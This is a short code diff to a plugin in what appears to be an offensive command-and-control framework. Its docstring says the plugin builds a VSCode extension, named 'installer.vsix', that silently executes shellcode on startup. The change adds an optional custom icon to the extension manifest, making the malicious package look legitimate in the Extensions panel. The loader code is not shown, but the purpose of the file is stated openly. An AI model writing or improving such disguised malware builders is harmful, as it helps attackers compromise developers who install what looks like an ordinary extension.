@@ -109,6 +109,8 @@ class VsCodeExtTriggerPlugin(ErebusPlugin):
         output_filename: str = "installer.vsix",
         # Pre-compiled DLL from the main builder (uses all Mythic parameters).
         prebuilt_dll_path: Optional[pathlib.Path] = None,
+        # Optional PNG icon shown in the VSCode Extensions panel.
+        custom_icon_path: Optional[pathlib.Path] = None,
     ) -> pathlib.Path:
         """
         Build a .vsix extension that silently executes shellcode on VSCode startup.
@@ -152,6 +154,11 @@ class VsCodeExtTriggerPlugin(ErebusPlugin):
                 "main": "./out/extension.js",
                 "contributes": {},
             }
+
+            if custom_icon_path is not None and pathlib.Path(custom_icon_path).exists():
+                shutil.copy(str(custom_icon_path), str(stage_dir / "icon.png"))
+                manifest["icon"] = "icon.png"
+
             (stage_dir / "package.json").write_text(
                 json.dumps(manifest, indent=2), encoding="utf-8"
             )
